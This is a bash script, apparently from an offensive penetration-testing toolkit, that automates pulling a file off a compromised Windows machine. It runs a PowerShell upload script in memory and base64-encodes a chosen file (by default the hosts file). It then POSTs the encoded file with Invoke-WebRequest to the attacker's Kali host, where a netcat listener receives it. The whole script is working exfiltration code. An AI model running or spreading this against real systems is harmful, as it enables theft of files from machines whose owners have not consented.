#!/bin/bash

: '
upload base64 file to upload server
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
LISTEN_PORT_FIELD=$(form_item "listen port" "number" "listen_port" "8000")
UPLOAD_FILE_LOCATION_FIELD=$(form_item "upload file location" "upload_file_location" "C:\Windows\System32\drivers\etc\hosts")

# Generate GUI form
generate_form "${LISTEN_PORT_FIELD}" "${UPLOAD_FILE_LOCATION_FIELD}" 

LISTEN_PORT=${form_data["listen_port"]}
UPLOAD_FILE_LOCATION=${form_data["upload_file_location"]}

LOCATION="${SCRIPTS_DIR}/fileTransfer/.files"
FILE="PSUpload.ps1"

ps_webclient_upload_file_and_execute_in_memory "${LOCATION}" "${FILE}"

execute_command "# make sure nc -lvnp ${LISTEN_PORT} is running in another window > echo <base64> | base64 -d -w 0 > $(basename "$(echo "${UPLOAD_FILE_LOCATION}" | sed 's|\\|/|g')")"
create_new_line
sleep 1

execute_command "\$b64 = [System.convert]::ToBase64String((Get-Content -Path '${UPLOAD_FILE_LOCATION}' -Encoding Byte))"
create_new_line
sleep 1

execute_command "Invoke-WebRequest -Uri http://${KALI_IP}:${LISTEN_PORT} -Method POST -Body \$b64"
create_new_line
